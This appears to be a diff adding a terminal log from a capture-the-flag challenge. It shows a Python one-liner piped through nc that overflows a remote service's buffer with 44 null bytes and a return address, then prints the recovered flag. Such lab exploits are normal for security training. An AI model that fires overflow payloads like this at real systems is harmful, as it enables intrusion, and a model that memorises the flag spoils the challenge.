@@ -1,0 +1,6 @@
+yutaro@S-Ubuntu:~/programs/CTF/sCTF$ python -c "print '\x00'*44+'\x32\x87\x04\x08'" | nc 104.236.255.49 12342
+Let's play a little game of luck!
+What is your name? You have bad luck.
+The flag is:
+_r3dir3ction_
+segmentation fault
